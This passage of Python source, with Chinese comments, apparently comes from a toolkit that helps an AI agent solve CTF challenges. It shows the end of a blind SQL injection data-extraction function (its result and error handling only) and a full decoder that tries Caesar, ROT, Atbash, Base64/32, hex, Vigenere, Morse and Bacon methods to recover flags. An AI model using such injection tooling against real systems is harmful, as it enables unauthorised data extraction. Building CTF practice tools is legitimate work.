        elapsed = round(time.time() - start_time, 2)
        logger.info(f"SQL盲注提取完成: '{extracted}' (长度={len(extracted)}, 请求={requests_count}次, 耗时={elapsed}s)")

        return {
            "success": True,
            "extracted_data": extracted,
            "length": len(extracted),
            "requests_count": requests_count,
            "elapsed": elapsed,
        }

    except Exception as e:
        elapsed = round(time.time() - start_time, 2)
        logger.error(f"SQL盲注提取失败: {e}")
        return {
            "success": False,
            "error": str(e),
            "extracted_data": extracted if 'extracted' in dir() else "",
            "requests_count": requests_count,
            "elapsed": elapsed,
        }


# === 密码自动分析解密工具（解决AI无法快速识别加密方式的问题）===
async def crypto_decode_all(data: str, known_prefix: str = "", known_format: str = "") -> Dict[str, Any]:
    """自动尝试常见CTF密码学解密方法

    对输入数据尝试所有常见解密方法，返回所有可能的结果。
    解决AI需要多次迭代尝试不同解密方法的问题。

    Args:
        data: 待解密的字符串(如 flst{ujufylksinqnke4m)
        known_prefix: 已知明文前缀(如 flag{)，用于验证解密结果
        known_format: 已知格式(如 flag{...}，ctf{...}，NSSCTF{...})

    Returns:
        dict: {success, results: [{method, decoded, match}], best_match, suggestion}
    """
    import string
    import base64
    import binascii

    results = []
    data = data.strip()

    if not data:
        return {"success": False, "error": "输入数据为空"}

    # 1. 凯撒密码（所有25种位移）
    for shift in range(1, 26):
        decoded = ""
        for c in data:
            if c.isalpha():
                base = ord('a') if c.islower() else ord('A')
                decoded += chr((ord(c) - base - shift) % 26 + base)
            else:
                decoded += c
        results.append({
            "method": f"caesar_shift_-{shift}",
            "decoded": decoded,
            "match": known_prefix.lower() in decoded.lower() if known_prefix else False,
        })
        # 反向也试
        decoded_rev = ""
        for c in data:
            if c.isalpha():
                base = ord('a') if c.islower() else ord('A')
                decoded_rev += chr((ord(c) - base + shift) % 26 + base)
            else:
                decoded_rev += c
        results.append({
            "method": f"caesar_shift_+{shift}",
            "decoded": decoded_rev,
            "match": known_prefix.lower() in decoded_rev.lower() if known_prefix else False,
        })

    # 2. ROT13
    rot13 = ""
    for c in data:
        if c.isalpha():
            base = ord('a') if c.islower() else ord('A')
            rot13 += chr((ord(c) - base + 13) % 26 + base)
        else:
            rot13 += c
    results.append({
        "method": "rot13",
        "decoded": rot13,
        "match": known_prefix.lower() in rot13.lower() if known_prefix else False,
    })

    # 3. ROT47
    rot47 = ""
    for c in data:
        o = ord(c)
        if 33 <= o <= 126:
            rot47 += chr(33 + (o - 33 + 47) % 94)
        else:
            rot47 += c
    results.append({
        "method": "rot47",
        "decoded": rot47,
        "match": known_prefix.lower() in rot47.lower() if known_prefix else False,
    })

    # 4. Atbash（字母反转 a↔z, A↔Z）
    atbash = ""
    for c in data:
        if c.islower():
            atbash += chr(ord('z') - (ord(c) - ord('a')))
        elif c.isupper():
            atbash += chr(ord('Z') - (ord(c) - ord('A')))
        else:
            atbash += c
    results.append({
        "method": "atbash",
        "decoded": atbash,
        "match": known_prefix.lower() in atbash.lower() if known_prefix else False,
    })

    # 5. Base64解码
    try:
        # 自动补齐padding
        padded = data + "=" * (4 - len(data) % 4) if len(data) % 4 else data
        b64_decoded = base64.b64decode(padded).decode("utf-8", errors="ignore")
        if b64_decoded and all(c.isprintable() or c in "\n\r\t" for c in b64_decoded):
            results.append({
                "method": "base64_decode",
                "decoded": b64_decoded,
                "match": known_prefix.lower() in b64_decoded.lower() if known_prefix else False,
            })
    except Exception:
        pass

    # 6. Base32解码
    try:
        padded = data.upper() + "=" * (8 - len(data) % 8) if len(data) % 8 else data.upper()
        b32_decoded = base64.b32decode(padded).decode("utf-8", errors="ignore")
        if b32_decoded and all(c.isprintable() or c in "\n\r\t" for c in b32_decoded):
            results.append({
                "method": "base32_decode",
                "decoded": b32_decoded,
                "match": known_prefix.lower() in b32_decoded.lower() if known_prefix else False,
            })
    except Exception:
        pass

    # 7. Hex解码
    try:
        hex_decoded = bytes.fromhex(data).decode("utf-8", errors="ignore")
        if hex_decoded and all(c.isprintable() or c in "\n\r\t" for c in hex_decoded):
            results.append({
                "method": "hex_decode",
                "decoded": hex_decoded,
                "match": known_prefix.lower() in hex_decoded.lower() if known_prefix else False,
            })
    except Exception:
        pass

    # 8. URL解码
    try:
        from urllib.parse import unquote
        url_decoded = unquote(data)
        if url_decoded != data:
            results.append({
                "method": "url_decode",
                "decoded": url_decoded,
                "match": known_prefix.lower() in url_decoded.lower() if known_prefix else False,
            })
    except Exception:
        pass

    # 9. 字母数字位移分析（如 flst→flag 是每个字母+1/+2等）
    # 检测是否是固定位移：flst vs flag
    if known_prefix and len(data) >= len(known_prefix):
        prefix_data = data[:len(known_prefix)]
        shifts = []
        consistent = True
        for i in range(len(known_prefix)):
            if prefix_data[i].isalpha() and known_prefix[i].isalpha():
                s = (ord(known_prefix[i].lower()) - ord(prefix_data[i].lower())) % 26
                shifts.append(s)
            else:
                shifts.append(0)

        if shifts and len(set(shifts)) == 1 and shifts[0] != 0:
            # 固定位移！
            shift = shifts[0]
            decoded = ""
            for c in data:
                if c.isalpha():
                    base = ord('a') if c.islower() else ord('A')
                    decoded += chr((ord(c) - base + shift) % 26 + base)
                else:
                    decoded += c
            results.append({
                "method": f"fixed_shift_+{shift} (detected from prefix '{prefix_data}'→'{known_prefix}')",
                "decoded": decoded,
                "match": True,
            })
        elif len(set(shifts)) > 1:
            # 非固定位移，可能是Vigenere或其他
            # 尝试Vigenere解密，key从已知前缀推导
            # 注意：key只包含字母字符对应的位移，非字母字符（如{）不加入key
            key = ""
            for i in range(len(known_prefix)):
                if prefix_data[i].isalpha() and known_prefix[i].isalpha():
                    k = (ord(known_prefix[i].lower()) - ord(prefix_data[i].lower())) % 26
                    key += chr(k + ord('a'))
                # 非字母字符不加入key，避免污染位移循环

            if key:
                decoded = ""
                ki = 0
                for c in data:
                    if c.isalpha():
                        base = ord('a') if c.islower() else ord('A')
                        k = ord(key[ki % len(key)].lower()) - ord('a')
                        decoded += chr((ord(c) - base + k) % 26 + base)
                        ki += 1
                    else:
                        decoded += c
                results.append({
                    "method": f"vigenere_key='{key}' (derived from prefix, non-alpha chars excluded from key)",
                    "decoded": decoded,
                    "match": True,
                })

    # 10. 字母序号分析（A=1, B=2, ...）
    # 11. Morse码解码（简单检测）
    if "." in data and "-" in data:
        morse_map = {
            ".-": "A", "-...": "B", "-.-.": "C", "-..": "D", ".": "E",
            "..-.": "F", "--.": "G", "....": "H", "..": "I", ".---": "J",
            "-.-": "K", ".-..": "L", "--": "M", "-.": "N", "---": "O",
            ".--.": "P", "--.-": "Q", ".-.": "R", "...": "S", "-": "T",
            "..-": "U", "...-": "V", ".--": "W", "-..-": "X", "-.--": "Y",
            "--..": "Z", "-----": "0", ".----": "1", "..---": "2", "...--": "3",
            "....-": "4", ".....": "5", "-....": "6", "--...": "7", "---..": "8", "----.": "9",
        }
        words = data.split("/")
        decoded_morse = ""
        for word in words:
            for code in word.split():
                if code in morse_map:
                    decoded_morse += morse_map[code]
            decoded_morse += " "
        decoded_morse = decoded_morse.strip()
        if decoded_morse:
            results.append({
                "method": "morse_decode",
                "decoded": decoded_morse,
                "match": known_prefix.lower() in decoded_morse.lower() if known_prefix else False,
            })

    # 12. 培根密码（5位AB组合）
    if len(data) >= 5 and all(c.lower() in "ab " for c in data):
        bacon_map = {
            "AAAAA": "A", "AAAAB": "B", "AAABA": "C", "AAABB": "D", "AABAA": "E",
            "AABAB": "F", "AABBA": "G", "AABBB": "H", "ABAAA": "I", "ABAAB": "J",
            "ABABA": "K", "ABABB": "L", "ABBAA": "M", "ABBAB": "N", "ABBBA": "O",
            "ABBBB": "P", "BAAAA": "Q", "BAAAB": "R", "BAABA": "S", "BAABB": "T",
            "BABAA": "U", "BABAB": "V", "BABBA": "W", "BABBB": "X", "BBAAA": "Y", "BBAAB": "Z",
        }
        cleaned = data.replace(" ", "").upper()
        bacon_decoded = ""
        for i in range(0, len(cleaned) - 4, 5):
            chunk = cleaned[i:i+5]
            if chunk in bacon_map:
                bacon_decoded += bacon_map[chunk]
        if bacon_decoded:
            results.append({
                "method": "bacon_decode",
                "decoded": bacon_decoded,
                "match": known_prefix.lower() in bacon_decoded.lower() if known_prefix else False,
            })

    # 筛选最佳匹配
    matches = [r for r in results if r["match"]]
    best_match = matches[0] if matches else None

    # 如果没有精确匹配，找最像flag的
    if not best_match:
        for r in results:
            decoded = r["decoded"]
            if known_format and known_format.lower() in decoded.lower():
                best_match = r
                break
            # 检查是否包含常见flag格式
            for fmt in ["flag{", "ctf{", "nssctf{", "fsctf{", "key{"]:
                if fmt in decoded.lower():
                    best_match = r
                    break
            if best_match:
                break

    suggestion = ""
    if best_match:
        suggestion = f"最佳匹配: {best_match['method']} → {best_match['decoded']}"
    else:
        # 分析位移模式
        if known_prefix and len(data) >= len(known_prefix):
            prefix_data = data[:len(known_prefix)]
            shifts = []
            for i in range(len(known_prefix)):
                if prefix_data[i].isalpha() and known_prefix[i].isalpha():
                    s = (ord(known_prefix[i].lower()) - ord(prefix_data[i].lower())) % 26
                    shifts.append(s)
            if shifts:
                if len(set(shifts)) == 1:
                    suggestion = f"检测到固定位移: {shifts[0]}，已用caesar_shift_+{shifts[0]}解密"
                else:
                    suggestion = f"检测到非固定位移({shifts})，可能是Vigenere密码，已尝试推导密钥"
            else:
                suggestion = "未找到匹配，可能需要自定义解密逻辑"
        else:
            suggestion = "未提供已知前缀，无法精确匹配。建议提供known_prefix参数(如flag{)以获得更好结果"

    return {
        "success": True,
        "input": data,
        "known_prefix": known_prefix,
        "total_methods_tried": len(results),
        "results": results,
        "best_match": best_match,
        "suggestion": suggestion,
    }
